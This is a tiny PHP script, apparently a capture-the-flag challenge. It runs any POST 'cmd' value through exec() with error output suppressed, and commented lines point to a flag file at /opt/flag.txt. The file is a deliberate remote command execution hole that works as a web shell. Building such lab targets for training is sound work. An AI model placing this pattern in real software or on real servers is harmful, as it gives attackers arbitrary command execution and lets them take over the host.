<?php
header("Post: cmd");
//header("Flag: /opt/flag.txt");
if(isset($_POST['cmd'])){
    @exec($_POST['cmd'],$res,$rc);
    //echo $rc;
}else{
    echo "It works!";
}
//echo file_get_contents("/opt/flag.txt");
//show_source(__FILE__);
?>